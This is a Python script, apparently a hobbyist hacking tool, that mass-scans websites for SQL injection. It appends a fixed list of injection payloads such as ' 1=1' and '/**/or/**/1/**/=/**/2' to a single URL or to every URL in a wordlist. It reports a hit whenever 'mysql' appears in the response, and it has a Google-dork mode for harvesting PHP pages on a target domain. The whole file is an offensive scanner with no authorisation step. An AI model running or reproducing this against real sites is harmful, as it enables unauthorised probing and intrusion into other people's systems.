import requests
from sys import argv
from colorama import Fore
from googlesearch import search





if argv[1] == '-h': # help ...
    print('''
    USEGE :
    
    -u : url website < for one url only >
    -g : google dork php < domnin only > 
    -w : wordlist url < in wordlist urls >
    -h : help ( this help )
    -f : For See My ِAِccounts
    ''')

elif argv[1] == '-u': # sqli for one url ...
    p1 = argv[2]+' 1=1'
    p2 = argv[2]+'(*'
    p3 = argv[2]+'and 1=1'
    p4 = argv[2]+'and 1=2'
    p5 = argv[2]+'and 1>2'
    p6 = argv[2]+'and 1<=2'
    p7 = argv[2]+'+and+1=1'
    p8 = argv[2]+'/**/and/**/1=1'
    p9 = argv[2]+'+and+50<=52'
    p10 = argv[2]+'/**/or/**/1/**/=/**/2'

    lst = [p1,p2,p3,p4,p5,p6,p7,p8,p9,p10] # list
    for i0 in lst:
        i0 = str(i0).strip()

        req = requests.get(i0).text

        if 'mysql' in req :
            print(f'[{Fore.GREEN+"+"}{Fore.WHITE}] Found sql-injection --->', i0)


        else:
            print(f'[{Fore.RED+"!"}{Fore.WHITE}] Not Found !!')


elif argv[1] == '-g' : # google dork php only ...
    php1 = 'site:'+argv[2]+'\t'+'inurl:php'
    for g_search in search(php1, stop=100) :
        print(f'[{Fore.GREEN+"+"}{Fore.WHITE}]',g_search)

elif argv[1] == '-w' :


    p1 =' 1=1'
    p2 ='(*'
    p3 ='and 1=1'
    p4 ='and 1=2'
    p5 ='and 1>2'
    p6 ='and 1<=2'
    p7 ='+and+1=1'
    p8 ='/**/and/**/1=1'
    p9 ='+and+50<=52'
    p10 ='/**/or/**/1/**/=/**/2'

    lst = [p1, p2, p3, p4, p5, p6, p7, p8, p9, p10]

    fils = open(argv[2], 'r').readlines()

    for x0 in fils :
        x0 = str(x0).strip()
        for i0 in lst :
            i0 = str(i0).strip()
            all_sql = x0+i0

            try:
                req = requests.get(all_sql).text

                if 'mysql' in req:
                    print(f'[{Fore.GREEN + "+"}{Fore.WHITE}] Found sql-injection --->', all_sql)


                else:
                    print(f'[{Fore.RED + "!"}{Fore.WHITE}] Not Found !!')
            except:
                pass


elif argv[1] == '-f':
    print('''
    instagram ---> @d_5tr
    telegram ---> @d5tr_cyber
    tema ---> zero one 
    ''')






